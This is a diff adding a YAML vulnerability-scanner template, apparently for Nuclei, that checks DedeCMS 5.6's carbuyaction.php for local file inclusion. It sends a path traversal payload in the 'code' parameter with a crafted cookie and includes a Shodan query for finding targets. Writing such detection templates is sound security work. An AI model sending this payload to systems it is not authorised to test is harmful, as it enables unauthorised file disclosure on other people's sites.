@@ -1,0 +1,48 @@
+# RAG Annotation:
+# name: DedeCmsV5.6 Carbuyaction Fileinclude
+# description: A vulnerability in DedeCMS's 'carbuyaction.php' endpoint allows remote attackers to return the content of locally stored files via a vulnerability in the 'code' parameter.
+# vuln_type: Security Assessment
+# severity: high
+# cve_id: N/A
+
+
+---
+id: dedecms-carbuyaction-fileinclude
+
+info:
+  name: DedeCmsV5.6 Carbuyaction Fileinclude
+  author: pikpikcu
+  severity: high
+  description: A vulnerability in DedeCMS's 'carbuyaction.php' endpoint allows remote attackers to return the content of locally stored files via a vulnerability in the 'code' parameter.
+  reference:
+    - https://www.cnblogs.com/milantgh/p/3615986.html
+  classification:
+    cpe: cpe:2.3:a:dedecms:dedecms:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: dedecms
+    product: dedecms
+    shodan-query: http.html:"power by dedecms" || title:"dedecms"
+  tags: dedecms,vuln
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/plus/carbuyaction.php?dopost=return&code=../../'
+
+    headers:
+      Cookie: code=cod
+    host-redirects: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Cod::respond()"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
